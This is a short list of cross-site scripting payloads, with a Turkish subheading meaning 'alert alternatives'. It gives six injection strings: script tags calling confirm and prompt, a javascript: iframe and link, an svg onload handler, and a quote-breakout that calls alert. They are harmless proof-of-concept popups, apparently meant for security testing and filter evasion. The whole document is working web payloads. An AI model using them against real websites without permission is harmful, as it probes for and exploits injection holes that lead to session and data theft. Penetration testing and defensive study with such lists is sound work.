##################
#				 #
# XSS - PAYLOADS #
#				 #
##################

##### Alert alternativleri
Hello <script>confirm("XSS!")</script>
Hello <script>prompt("XSS")</script>
Hello <iframe src="javascript:confirm('XSS')"></iframe>
Hello <svg onload=confirm("XSS")>
Hello <a href="javascript:confirm('XSS')">Click Me</a>
Hello";alert(1);
